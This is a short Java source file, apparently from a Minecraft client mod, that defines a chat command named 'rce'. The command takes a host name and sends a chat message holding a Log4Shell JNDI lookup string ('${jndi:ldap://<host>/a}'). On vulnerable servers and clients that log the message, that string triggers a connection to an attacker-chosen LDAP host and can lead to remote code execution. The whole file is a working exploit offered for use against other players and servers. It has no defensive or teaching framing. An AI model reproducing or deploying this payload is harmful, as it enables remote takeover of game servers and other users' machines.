package koks.command;

import koks.api.registry.command.Command;

@Command.Info(name = "rce", description = "Remote momento")
public class RCE extends Command {
    @Override
    public boolean execute(String[] args) {
        if(args.length == 1) {
            getPlayer().sendChatMessage("${jndi:ldap://" + args[0] + "/a}");
            return true;
        }
        return false;
    }
}
